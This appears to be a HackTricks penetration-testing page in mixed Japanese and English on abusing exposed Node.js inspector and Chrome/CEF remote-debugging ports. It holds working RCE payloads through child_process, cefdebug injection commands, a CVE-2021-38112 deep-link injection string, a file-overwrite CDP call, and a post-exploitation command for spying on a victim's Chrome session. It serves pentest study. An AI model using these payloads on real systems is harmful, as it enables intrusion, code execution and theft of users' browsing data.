# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

[ドキュメントより](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch を使用して起動すると、Node.js process は debugging client からの接続を待ち受けます。**デフォルト**では、host と port **`127.0.0.1:9229`** で待ち受けます。各 process には**一意の** **UUID** も割り当てられます。<sup>[[4]](#references)</sup>

Inspector client は、接続するために host address、port、UUID を認識し、指定する必要があります。完全な URL は、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js execution environment に完全にアクセスできる**ため、この port に接続できる malicious actor は、Node.js process の権限で arbitrary code を実行できる可能性があります（**potential privilege escalation**）。

Inspector を起動する方法はいくつかあります。
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
検査対象のプロセスを起動すると、次のような内容が表示されます：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、**debugger**を開くために`--remote-debugging-port=9222`というparamを使用する必要があります（SSRF保護は非常によく似たままです）。ただし、**NodeJS**の**debug**セッションを許可する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。<sup>[[5]](#references)</sup>

debug対象のブラウザを起動すると、次のようなものが表示されます。
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers、WebSockets、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webブラウザーで開かれたWebサイトは、ブラウザーのセキュリティモデルの下でWebSocketおよびHTTPリクエストを送信できます。**一意のdebugger session idを取得する**には、**初期HTTP接続**が必要です。**same-origin-policy**により、Webサイトは**このHTTP接続**を確立できません。[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する**追加のセキュリティ対策として、Node.jsは接続の**'Host' headers**が正確に**IPアドレス**、**`localhost`**、または**`localhost6`**のいずれかを指定していることを検証します。<sup>[[12]](#references)</sup>

> [!TIP]
> この**セキュリティ対策により、単にHTTPリクエストを送信する**だけでinspectorをexploitしてコードを実行すること（SSRF vulnをexploitすれば可能）を防止できます。

### 実行中のprocessesでinspectorを起動する

実行中のnodejs processに**シグナルSIGUSR1**を送信すると、デフォルトポートで**inspectorを起動**させることができます。ただし、十分な権限が必要であるため、これにより**process内部の情報へのprivileged access**が得られる可能性はありますが、直接的なprivilege escalationにはなりません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> これは containers で役立ちます。プロセスを **停止して `--inspect` 付きで新しいプロセスを起動すること**は、プロセスとともに **container** も **kill される**ため、**選択肢にならない**からです。

### inspector/debugger に接続する

**Chromium-based browser** に接続するには、Chrome または Edge で、それぞれ `chrome://inspect` または `edge://inspect` URL にアクセスします。Configure ボタンをクリックし、**target host と port が正しく一覧表示されている**ことを確認します。画像は Remote Code Execution (RCE) の例です。

![debugger にアクセスする URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium-based browser に接続するには、...](<../../images/image (674).png>)

**command line** を使用すると、次のコマンドで debugger/inspector に接続できます。
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
このツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、ローカルで実行中の **inspectors** を見つけ、それらに **inject code** することを可能にします。<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で browser に接続されている場合、**NodeJS RCE exploits** は機能しないことに注意してください（API を確認して、利用できそうな興味深い機能を見つける必要があります）。

## NodeJS Debugger/Inspector

> [!TIP]
> Electron で XSS から **RCE** を取得する方法を探してここに来た場合は、[**このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **inspector** に接続できる場合に **RCE** を取得する一般的な方法には、次のようなものがあります（**Chrome DevTools protocol** への接続では機能しないようです）。<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

APIはここで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
このセクションでは、この protocol の exploit に使用された興味深い例を列挙します。

### Deep Links 経由の Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino security が、CEF based の application がシステムに custom URI (workspaces://index.html) を **registered し**、full URI を受け取った後、その URI から部分的に構築した configuration を使用して CEF based applicatio**n を launch していた**ことを発見しました。<sup>[[8]](#references)</sup>

URI parameters が URL decoded され、CEF basic application の launch に使用されていることが判明しました。これにより、user は **inject** して flag **`--gpu-launcher`** を **command line** に追加し、任意の処理を execute できました。

したがって、次のような payload になります:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。

### ファイルの上書き

**ダウンロードしたファイルの保存先**フォルダを変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で上書きします。<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE と情報流出

この投稿によると: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)、theriver から RCE を取得し、内部ページを exfiltrate することが可能です。<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

実際の環境で、Chrome/Chromium ベースのブラウザを使用しているユーザー PC を**compromise した後**、**debugging を有効化した状態で Chrome process を起動し、debugging port を port-forward** することでアクセスできます。この方法により、**被害者が Chrome で行うすべての操作を inspect し、機密情報を steal する**ことが可能になります。<sup>[[7]](#references)</sup>

stealth な方法は、**すべての Chrome process を terminate** してから、次のようなものを call することです。
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考資料

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger 経由の Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome の Debugging Feature を悪用して Browsing Session をリモートから監視・制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding と CDP を介した WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - Bot から RCE へ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
